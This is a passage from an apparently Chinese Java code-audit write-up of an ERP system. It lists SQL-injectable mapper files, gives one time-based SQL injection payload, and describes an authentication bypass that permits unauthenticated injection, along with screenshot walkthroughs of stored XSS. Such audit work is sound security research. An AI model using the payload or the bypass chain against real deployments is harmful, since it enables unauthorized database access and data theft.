    - payload : 111' OR SLEEP(5) OR '1'='1
+ <font style="color:#080808;background-color:#ffffff;">MaterialMapperEx.xml	（功能点在“商品管理”-“商品信息”）</font>
+ <font style="color:#080808;background-color:#ffffff;">PersonMapperEx.xml	（功能点在“基本资料”-“经手人管理”）</font>
+ <font style="color:#080808;background-color:#ffffff;">RoleMapperEx.xml	（功能点在“系统管理”-“角色管理”）</font>
+ <font style="color:#080808;background-color:#ffffff;">UnitMapperEx.xml	（功能点在“商品管理”-“计量单位”）</font>
+ <font style="color:#080808;background-color:#ffffff;">UserMapperEx.xml	（功能点在“系统管理”-“用户管理”）</font>

## 4、身份验证&鉴权
这一部分依旧是 LogCostFilter.java 发现的漏洞点，在SQL 注入中，我们登录到后台进行的注入，那么结合鉴权漏洞，就可以未登录进行SQL注入。



从图片看到，绕过身份验证也可以进行SQL注入

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png)



# 漏洞复现：
## 1、<font style="color:rgb(31, 45, 61);">存储型XSS</font>
很多功能点都存在此漏洞，以下举三例：

### 1.1 用户管理
先新增一个用户

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png)

修改用户名

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png)

出现弹窗

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png)



找到源码：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png)

接收前端传入的 info 参数，检查用户数量是否超限，并没有做任何特殊字符过滤，这里就是XSS 的入口点



### 1.2 商品信息
增加商品：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png)

五个地方都会弹窗

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png)



### 1.3 收入单
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png)







# 参考文章：
<font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）

[https://blog.csdn.net/Adminxe/article/details/105918000](https://blog.csdn.net/Adminxe/article/details/105918000)

<font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945 mybatis二级缓存反序列化的分析与复现</font>

[https://www.freebuf.com/vuls/251862.html](https://www.freebuf.com/vuls/251862.html)

<font style="color:rgba(0, 0, 0, 0.85);">MyBatis远程代码执行漏洞CVE-2020-26945</font>

[https://www.freebuf.com/articles/web/252542.html](https://www.freebuf.com/articles/web/252542.html)

<font style="color:rgba(0, 0, 0, 0.85);">Java 代码审计之华夏 ERP CMS v2.3</font>

[<font style="color:rgb(65, 131, 196);">https://www.freebuf.com/articles/web/347135.html</font>](https://www.freebuf.com/articles/web/347135.html)

【Java代码审计】华夏-ERPv2.3

[<font style="color:rgb(65, 131, 196);">https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html</font>](https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html)























